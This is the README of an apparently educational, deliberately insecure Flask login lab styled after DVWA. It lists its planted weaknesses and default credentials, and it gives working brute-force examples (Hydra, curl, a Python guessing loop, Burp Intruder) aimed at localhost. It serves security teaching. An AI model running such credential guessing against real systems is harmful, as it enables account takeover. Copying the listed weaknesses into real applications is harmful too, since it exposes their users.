# DVWA Brute Force Lab

A self-contained, intentionally vulnerable login application for teaching brute force attack
concepts to cybersecurity students. Styled after Damn Vulnerable Web Application (DVWA).

---

## ⚠ WARNING

This application is **intentionally insecure**. Run it only on:
- Your local machine
- An isolated lab network
- A private classroom environment

**Never expose this to the public internet.**

---

## Features

| Vulnerability | Detail |
|---|---|
| HTTP GET login | Credentials appear in URL, server logs, and browser history |
| No rate limiting | Unlimited requests at full speed |
| No account lockout | No penalty for failed attempts |
| No CSRF protection | Form has no state token |
| Verbose errors | Reveals whether a username exists |
| Plaintext passwords | Stored and displayed in memory without hashing |
| Session fixation | Session ID not rotated on login |
| Debug mode on | Flask stack traces exposed on errors |

---

## Quick Start

### Option A — Docker Compose (recommended)

```bash
docker compose up --build
```

Then open: http://localhost:5000

### Option B — Docker only

```bash
docker build -t dvwa-brute .
docker run -p 5000:5000 dvwa-brute
```

### Option C — Python directly

```bash
pip install -r requirements.txt
python app.py
```

---

## Application URLs

| URL | Description |
|---|---|
| `http://localhost:5000/` | Redirects to login |
| `http://localhost:5000/vulnerabilities/brute/` | Main login target |
| `http://localhost:5000/attack-log` | Live log of all login attempts |
| `http://localhost:5000/api/log` | JSON API for the attack log |
| `http://localhost:5000/api/reset-log` | POST to clear the log |
| `http://localhost:5000/setup` | Shows all credentials and config |

---

## Default Credentials

| Username | Password | Role |
|---|---|---|
| admin | password | Administrator |
| gordonb | abc123 | User |
| 1337 | charley | User |
| pablo | letmein | User |
| smithy | password | User |

---

## Attack Examples

### Hydra

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
    127.0.0.1 -s 5000 http-get-form \
    "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:incorrect"
```

### curl

```bash
curl "http://127.0.0.1:5000/vulnerabilities/brute/?username=admin&password=password&Login=Login"
```

### Python script

```python
import requests

target = "http://127.0.0.1:5000/vulnerabilities/brute/"
passwords = ["123456", "password", "abc123", "letmein", "charley"]

for pwd in passwords:
    r = requests.get(target, params={
        "username": "admin",
        "password": pwd,
        "Login": "Login"
    })
    if "FLAG{" in r.text:
        print(f"[+] Found: admin / {pwd}")
        break
    print(f"[-] Failed: {pwd}")
```

### Burp Suite Intruder

1. Intercept the login GET request with Burp Proxy
2. Right-click → Send to Intruder
3. Mark `password` value as §payload§
4. Payloads tab → load a wordlist
5. Start attack → sort by Response Length to spot the success

---

## Project Structure

```
dvwa-brute/
├── app.py                  # Flask backend
├── requirements.txt
├── Dockerfile
├── docker-compose.yml
├── .dockerignore
├── templates/
│   ├── brute.html          # Main login page
│   ├── attack_log.html     # Live attack log
│   └── setup.html          # Credential & config page
└── static/
    ├── css/dvwa.css         # DVWA-style stylesheet
    └── js/dvwa.js           # Tab switching + GET URL preview
```
